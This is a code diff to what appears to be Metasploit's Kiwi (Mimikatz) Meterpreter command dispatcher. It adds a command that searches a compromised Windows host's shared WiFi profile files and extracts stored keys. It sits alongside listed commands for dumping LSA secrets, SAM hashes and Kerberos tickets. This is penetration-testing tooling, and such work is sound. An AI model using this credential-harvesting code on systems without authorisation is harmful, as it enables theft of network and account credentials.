@@ -32,13 +32,13 @@ class Console::CommandDispatcher::Kiwi
   #
   # Initializes an instance of the priv command interaction. This function
   # also outputs a banner which gives proper acknowledgement to the original
-  # author of the Mimikatz 2.0 software.
+  # author of the Mimikatz software.
   #
   def initialize(shell)
     super
     print_line
     print_line
-    print_line("  .#####.   mimikatz 2.1 (#{client.session_type})")
+    print_line("  .#####.   mimikatz 2.1.1-20170409 (#{client.session_type})")
     print_line(" .## ^ ##.  \"A La Vie, A L'Amour\"")
     print_line(" ## / \\ ##  /* * *")
     print_line(" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
@@ -72,7 +72,8 @@ class Console::CommandDispatcher::Kiwi
       'kerberos_ticket_list'  => 'List all kerberos tickets (unparsed)',
       'lsa_dump_secrets'      => 'Dump LSA secrets (unparsed)',
       'lsa_dump_sam'          => 'Dump LSA SAM (unparsed)',
-      'wifi_list'             => 'List wifi profiles/creds',
+      'wifi_list'             => 'List wifi profiles/creds for the current user',
+      'wifi_list_shared'      => 'List shared wifi profiles/creds (requires SYSTEM)',
     }
   end
 
@@ -303,37 +304,50 @@ class Console::CommandDispatcher::Kiwi
   end
 
   #
-  # Dump all the wifi profiles/credentials
+  # Dump all the shared wifi profiles/credentials
+  #
+  def cmd_wifi_list_shared(*args)
+    interfaces_dir = '%AllUsersProfile%\Microsoft\Wlansvc\Profiles\Interfaces'
+    interfaces_dir = client.fs.file.expand_path(interfaces_dir)
+    files = client.fs.file.search(interfaces_dir, '*.xml', true)
+
+    if files.length == 0
+      print_error('No shared WiFi profiles found.')
+    else
+      interfaces = {}
+      files.each do |f|
+        interface_guid = f['path'].split("\\")[-1]
+        full_path = "#{f['path']}\\#{f['name']}"
+
+        interfaces[interface_guid] ||= []
+        interfaces[interface_guid] << full_path
+      end
+      results = client.kiwi.wifi_parse_shared(interfaces)
+
+      if results.length > 0
+        display_wifi_profiles(results)
+      else
+        print_line
+        print_error('No shared wireless profiles found on the target.')
+      end
+    end
+
+    true
+  end
+
+  #
+  # Dump all the wifi profiles/credentials for the current user
   #
   def cmd_wifi_list(*args)
     results = client.kiwi.wifi_list
-
     if results.length > 0
-      results.each do |r|
-        table = Rex::Text::Table.new(
-          'Header'    => "#{r[:desc]} - #{r[:guid]}",
-          'Indent'    => 0,
-          'SortIndex' => 0,
-          'Columns'   => [
-            'Name', 'Auth', 'Type', 'Shared Key'
-          ]
-        )
-
-        print_line
-        r[:profiles].each do |p|
-          table << [p[:name], p[:auth], p[:key_type], p[:shared_key]]
-        end
-
-        print_line(table.to_s)
-        print_line("State: #{r[:state]}")
-      end
+      display_wifi_profiles(results)
     else
       print_line
       print_error('No wireless profiles found on the target.')
     end
 
-    print_line
-    return true
+    true
   end
 
   @@creds_opts = Rex::Parser::Arguments.new(
@@ -400,6 +414,30 @@ class Console::CommandDispatcher::Kiwi
   end
 
 protected
+
+  def display_wifi_profiles(profiles)
+    profiles.each do |r|
+      header = r[:guid]
+      header = "#{r[:desc]} - #{header}" if r[:desc]
+      table = Rex::Text::Table.new(
+        'Header'    => header,
+        'Indent'    => 0,
+        'SortIndex' => 0,
+        'Columns'   => [
+          'Name', 'Auth', 'Type', 'Shared Key'
+        ]
+      )
+
+      print_line
+      r[:profiles].each do |p|
+        table << [p[:name], p[:auth], p[:key_type] || 'Unknown', p[:shared_key]]
+      end
+
+      print_line(table.to_s)
+      print_line("State: #{r[:state] || 'Unknown'}")
+    end
+  end
+
 
   def check_is_domain_user(msg='Running as SYSTEM, function will not work.')
     if client.sys.config.is_system?
